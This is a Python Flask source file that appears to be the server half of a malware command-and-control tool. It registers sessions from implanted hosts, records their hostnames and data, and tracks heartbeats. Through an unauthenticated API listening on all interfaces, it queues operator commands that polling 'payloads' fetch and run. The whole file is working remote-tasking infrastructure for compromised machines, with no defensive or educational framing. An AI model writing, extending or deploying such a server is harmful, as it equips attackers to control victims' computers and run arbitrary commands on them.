from flask import Flask, request, jsonify
import time

SESSIONS = {}
TASKS = {} # New dictionary to hold tasks for each session

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get("session_id")
    if session_id:
        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received new session: {data.get('hostname')}")
        SESSIONS[session_id] = {"session_id": session_id, "hostname": data.get("hostname"), "data": data.get("data"), "last_seen": time.time()}
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        SESSIONS[session_id]["last_seen"] = time.time()
        # Check for tasks and send them back to the payload.
        # .pop() gets the tasks and removes them so they don't run again.
        tasks_for_session = TASKS.pop(session_id, [])
        return jsonify({"status": "ok", "tasks": tasks_for_session})
    return jsonify({"status": "ok", "tasks": []})

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions():
    return jsonify(list(SESSIONS.values()))

@app.route('/api/delete_session', methods=['POST'])
def delete_session():
    data = request.json; session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        del SESSIONS[session_id]
        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Deleted session: {session_id}")
        return jsonify({"status": "deleted"}), 200
    return jsonify({"status": "not_found"}), 404

# --- NEW ENDPOINT FOR THE GUI TO SEND TASKS ---
@app.route('/api/task', methods=['POST'])
def task_session():
    data = request.json
    session_id = data.get("session_id")
    command = data.get("command")

    if not all([session_id, command]):
        return jsonify({"status": "error", "message": "Missing session_id or command"}), 400

    if session_id not in TASKS:
        TASKS[session_id] = []
    
    TASKS[session_id].append(data) # Add the full task dictionary
    print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Task '{command}' queued for session {session_id}")
    return jsonify({"status": "tasked"})

def run_server():
    app.run(host='0.0.0.0', port=5001)